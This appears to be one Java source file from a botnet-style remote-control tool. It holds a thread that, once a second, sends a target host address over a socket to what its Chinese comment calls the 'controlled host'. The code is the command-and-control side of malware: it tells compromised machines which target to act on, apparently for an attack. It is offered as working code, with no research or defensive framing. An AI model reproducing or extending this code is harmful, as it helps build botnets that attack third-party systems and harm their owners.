package com.zhanyingwl.www;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;

import static com.zhanyingwl.www.InputTargetThread.targetHost;

public class doSend extends Thread {
    Socket socket = Runner.socket;

    @Override
    public void run() { // 不断地对被控主机发送行动需求（啥也不干或者目标IP）
        try {
            while (true) {
                sleep(1000);
                OutputStream os = socket.getOutputStream();
                PrintStream ps = new PrintStream(os);
                ps.println(targetHost);
                os.flush();
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}